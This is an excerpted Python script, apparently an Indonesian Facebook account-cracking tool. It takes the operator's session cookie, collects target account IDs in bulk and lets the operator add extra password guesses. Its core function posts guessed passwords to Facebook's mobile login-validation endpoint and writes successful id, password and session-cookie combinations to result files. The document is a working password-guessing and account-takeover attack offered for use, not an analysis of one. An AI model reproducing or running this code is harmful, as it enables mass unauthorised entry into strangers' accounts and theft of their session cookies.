...
try:
	...
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mError Not Found 404]')
...
def login_lagi334():
	try:
		...
		cookie = input(f'{P}┏──[MASUKKAN COOKIES FACEBOOK]\n┣─[Jangan Gunakan Akun Pribadi Atau Akun Utama] {H}!!\n{P}│\n┗─➤ {asu}')
		...
		print(f'\n{x}[{h}•{x}]{h} LOGIN SUCCESSFUL....Run the command again !!\n');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	#orang_asing(f'{P}└─ Your Id  : '+str(my_id))
	#orang_asing(f'└─ Your Ip  : {ip}')
	#print(f'└─ Github   : x505x')
	#print(f'{P}')
	orang_asing(f'{P}├─[{H}1{P}] Crack Publik ({H}Massal{P})' * 1)
	orang_asing(f'├─[{H}2{P}] Crack File' * 1)
	orang_asing(f'├─[{H}3{P}] Lihat Hasil Crack' * 1)
	orang_asing(f'├─[{H}4{P}] Cek Opsi ({B}Akun Checkpoint{P})' * 1)
	orang_asing(f'├─[{H}0{P}] Keluar ({M}Delete Cookie{P})' * 1)
	#cetak(nel('[cyan][white] [1] Crack Publik\n[cyan][white] [2] Crack File\n[green] [3] Results\n[blue] [4] Cek Tap Yes\n[red] [0] Exit[white] '))
	print(f'{P}')
	manusia_biasa = input(f'├─Pilih : {H}')
	print(f'{P}')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'├─input target amount ? : {H}'))
		print(f'{P}')
	except ValueError:
		print(f'{P}└─{M}Masukkan Angka,Jangan Huruf{P} ')
		exit()
	if jum<1 or jum>100:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'{P}├─Enter the Id {b}'+str(yz)+' : ')
		uid.append(kl)
	print(f'{P}')
	for userr in uid:
		try:
	...
	if len(vin)==0:
		...
		for isi in vin:
			...
			if cih<100:
				...
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'┣━━➤ {U}[%s] {P}%s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
...
def setting():
	#orang_asing('#' * 54)
	#orang_asing(f'{P}↓ ID Order Setting ↓')
	print(f'{P}')
	orang_asing(f'├─[{H}1{P}] {m}Tua{P}' * 1)
	orang_asing(f'├─[{H}2{P}] {H}Muda{P}' * 1)
	orang_asing(f'├─[{H}3{P}] {k}Acak{P}' * 1)
	print(f'{P}')
	hu = input(f'├─Pilih : {H}')
	if hu in ['1','01']:
	...
	print(f'{P}')
	orang_asing(f'├─[{H}1{P}] m.facebook{P}' * 1)
	orang_asing(f'├─[{H}2{P}] free.facebook{P}' * 1)
	orang_asing(f'├─[{H}3{P}] mbasic.facebook{P}' * 1)
	orang_asing(f'├─[{H}4{P}] touch.facebook{P}' * 1)
	orang_asing(f'├─[{H}5{P}] mtouch.facebook{P}' * 1)
	#orang_asing(f'├─[{H}5{P}] method baru ✓ ({H}Rekomendasi{P})' * 1)
	print(f'{P}')
	hc = input(f'├─Pilih : {H}')
	if hc in ['1','01']:
		...
		passwrd()
	print(f'{P}')
	#pwplus=input(f'├─Add Password Manual y/t > ')
	pwplus=input(f'├─Add Password Manual y/t > : {H}')
	#orang_asing('=' * 54)
	if pwplus in ['y','Y','ya','Ya','yes','Yes']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		#print(f'{P}')
		pwku=input(f'{P}├─Enter Additional Password : {b}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	global prog,des
	print(f'{P}')
	print(f'├─Results {h}OK{P} Save in : {h}OK/%s {P}'%(okc))
	print(f'├─Results {k}CP{P} Save in : {k}CP/%s {P}'%(cpc))
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}┏─{K}[ {B}{tahun(idf)}{K} ]')
				print(f'\r{P}┣─{P}[{K} {idf}|{pw}{P} ]')
				print(f'\r{P}┗➤ {b}{ua}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}┏─{H}[ {B}{tahun(idf)}{H} ]')
				print(f'\r{P}┗─[ {H}{idf}|{pw}{P} ]')
				print(f'\r{P}{b}<><><><><><><><><><><><><><><><><><><><><><><><><><><>{x}{H}{kuki}{H}')
				#print(f'\r{P}┗─➤{x}{B}{ua}{B}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		...
		print("%s╰─ \033[0mlogin gagal, katasandi salah"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
